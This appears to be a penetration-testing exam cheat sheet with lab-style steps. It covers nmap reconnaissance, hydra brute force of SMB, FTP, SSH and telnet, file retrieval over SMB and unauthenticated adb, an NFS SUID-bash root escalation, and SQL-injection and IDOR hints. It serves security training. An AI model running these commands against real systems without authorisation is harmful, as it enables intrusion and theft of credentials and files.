 How to foot print Domain
nmap -T4 -A -p 389,636,3268,3269 192.168.x.x/2x
or
nmap -p 389 --script ldap-rootdse <target_IP>

Wamp server
nmap -T4 -A 192.168.x.x/2x

OR 

nmap -T4 -A -p 80,443 192.168.x.x/2x

Look for specific banners or headers that indicate the presence of WampServer. This may include strings like "WampServer" or "Apache" in HTTP response headers or a the existense of MySql service

 How to exploit smb
nmap -T4 -A -p 139,445 192.168.x.x/2x
OR
nmap -p 139,445 -sV 192.168.x.x/2x

Brute force SMB with hydra
hydra -l USER_NAME -P password_file TARGET_IP smb

Once SMB credentials are obtained, you can use tools like smbclient 
to connect to the SMB share and retrieve files.
smbclient //target_ip/ -U USER_NAME 
get file.txt
OR 
smbmap -u USER_NAME -p 'PASSWORD' -H TARGET_IP --download 'C$\file.txt'


Decrypt Encoded File:
Use bctextencoder or any other tool to decrypt the file using the users password
OR
snow.exe -C -p “password” file.txt

How to access mobile device
Scan adb port: nmap -sV -p 5555 192.168.x.x/2x
Connect adb: adb connect TARGET_IP:5555

Access mobile device: 
adb shell 
pwd 
ls
cd 
sdcard/scan 
ls 
cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)

Download files: adb pull /sdcard/scan (if it doesn't work we need to elevate privilege using sudo -i)

We've three elf files, now we need to calculate entropy for each of them using this command: ent file.elf

After selecting file.elf with highest entropy, we need to calculate hash of SHA 384: 
sha384sum file.elf 
and consider only the last 4 digits of the hash result. --> Use hashcalc




Start OpenVAS:
Start the OpenVAS service, and access the web interface.

Create a Target:
In the OpenVAS web interface, create a new target with the IP address.

Create a Task:
Create a new task, and associate it with the target you just created.

Run the Scan:
Start the vulnerability scan by running the task.

Review Scan Results:
After the scan is complete, review the scan results to identify vulnerabilities.

Identify the End-of-Life Vulnerability:
Look for vulnerabilities related to the End-of-Life (EOL) of the web development language platform. 
This might be indicated in the scan results with a high severity score.

Retrieve Severity Score:
Retrieve the severity score associated with the vulnerability indicating the End-of-Life 
of the web development language platform.

 How to scan network
nmap -T4 -A 192.168.x.x/2x

OR 

nmap -T4 -A -p 80,443 192.168.x.x/2x

Look out for telnet or ssh and bruteforce it
hydra -L username_file -P password_file TARGET_IP telnet
or
hydra -L username_file -P password_file TARGET_IP ssh

Login to the identified service and search for the file


Analyze the image file and extract the sensitive data hidden in the file
Use OpenStego on Windows
Select Extract Data
Upload file and select path of destination
Use any pointer from the question as keyword where applicable
Click to Extract Data





Question 8:
Exploit weak credentials used for ftp service on a windows machine in the 192.168.0.0/24 subnet. Obtain the file, Credential.txt, hosted on the ftp root, and enter its content as the answer.



Steps:
Identify FTP Service:
nmap -p 21 192.x.x.0/24

Exploit Weak Credentials:
Use a tool like hydra or medusa to perform a brute-force attack on the FTP service using a wordlist.
hydra -L username_file -P password_file 192.168.0.x ftp
Replace <username> with the FTP username and <passwords.txt> with a file containing a list of 
possible passwords.

Connect to FTP Server:
Once you have valid credentials, connect to the FTP server using an FTP client.
ftp 192.168.0.x
Retrieve file:
get file
View Content:
cat file


vulnerability : Nfs squash method if you have time Follow this tutorial only

or
 Perform vertical privilege escalation of a root user, and enter the flag
Exploiting misconfigured NFS (port 2049)

* `nmap -sV —p 2049 IP/Subnet`
* `sudo apt-get install nfs-common`
* `nmap -sV —script=nfs-showmount <Target_IP>`
* check available mounts: `showmount -e <Target_IP>` -> we will see /home directory
* `mkdir /tmp/nfs`
* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`
* `cd /tmp/nfs`
* `sudo cp /bin/bash .`
* `sudo chmod +s bash` -> it will be highlighted in red
* `ls -la`
* `sudo df -h`
* `sudo chmod +s bash`

after them, In another terminal:

* Access to target using SSH
ssh smith@192.168.0.x
* `./bash -p` and we're root!
* `cd /home`
* `ls -la`
* Find the flag: `find / -name "*.txt" -ls 2> /dev/null`

 Identify malware entry point address

 [PEiD](https://softfamous.com/peid/) (suggested)

* If tool is not alreay on system, Download PEiF tool -> 
[https://softfamous.com/peid/](https://softfamous.com/peid/)
* Execute PEiD tool
* Upload malware executable
* See entry point address

 **PEView**

* If tool is not alreay on system, Download PEView tool
* Execute tool
* Upload malware executable
* Look for the "Optional Header" section within the PEView interface. 
In this section, you should find the "AddressOfEntryPoint" field, 
which represents the entry point of the executable. Note the hexadecimal value displayed in the 
"AddressOfEntryPoint" field. This is the entry point address of the executable.

 Detect it easy

* Execute Detect it easy client tool
* Upload malware executable
* Click to File info
* See entry point address

**To find DOS (SYN and ACK) :*
open file with wireshark
* statistic -> IPv4 statistics -> source and destination address
* filter using: `tcp.flags.syn == 1` 
or 
`tcp.flags.syn == 1 and tcp.flags.ack == 0` 
or 
filter to highest number of request

If we have a login account we can login or use sqli on the login page and go to profile. 
There, we can use IDOR vulnerability (manipulating =id value on url) and seeing 
info regarding another user.

In alternative we can use SQLMap and the vulnerable url after login to dump user info.
